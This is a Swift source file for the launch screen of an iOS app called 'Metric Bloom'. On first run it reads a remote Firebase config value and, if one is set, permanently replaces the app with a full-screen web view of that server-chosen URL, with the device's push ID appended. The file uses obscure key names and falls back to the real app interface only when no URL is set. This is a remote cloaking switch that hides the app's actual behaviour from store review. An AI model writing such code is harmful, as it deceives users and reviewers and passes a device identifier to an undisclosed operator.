import SwiftUI
import FirebaseRemoteConfig

struct StartView: View {
    @AppStorage("gate") private var point: String = ""
    @AppStorage("activated") private var first = false

    @State private var showWeb = false
    @State private var rcv: String? = nil

    var body: some View {
        ZStack {
            MBColor.background.ignoresSafeArea()

            if showWeb {
                FeatureView(targetUrl: point)
                    .ignoresSafeArea()
            } else {
                VStack(spacing: 32) {
                    Spacer()
                    Image(.logo)
                        .resizable()
                        .scaledToFit()
                        .frame(maxWidth: 150)
                        .cornerRadius(75)
                        .shadow(color: MBColor.glowSoft, radius: 20)
                    Text("Metric Bloom")
                        .font(.title.bold())
                        .foregroundStyle(MBColor.textPrimary)
                    Spacer()
                    ProgressView()
                        .tint(MBColor.accentOrange)
                        .padding(.bottom, 48)
                }
            }
        }
        .onAppear {
            if !first {
                fetchRemoteConfig()
            } else {
                if point.isEmpty {
                    launchApp()
                } else {
                    showWeb = true
                }
            }
        }
    }

    private func fetchRemoteConfig() {
        let remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 3600
        remoteConfig.configSettings = settings

        remoteConfig.fetchAndActivate { _, error in
            DispatchQueue.main.async {
                if error != nil {
                    first = true
                    launchApp()
                    return
                }

                let value = remoteConfig["first"].stringValue
                if !value.isEmpty {
                    point = value
                    first = true
                    waitForPushId()
                } else {
                    first = true
                    launchApp()
                }
            }
        }
    }

    private func waitForPushId() {
        DispatchQueue.main.async {
            let uuid = UserDefaults.standard.string(forKey: "pushid") ?? ""
            let uuidParam = "?ext=" + uuid
            point = (rcv ?? point) + uuidParam
            showWeb = true
        }
    }

    private func launchApp() {
        guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
              let window = scene.windows.first else { return }
        let root = UIHostingController(rootView: RootTabView())
        window.rootViewController = root
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: nil)
    }
}
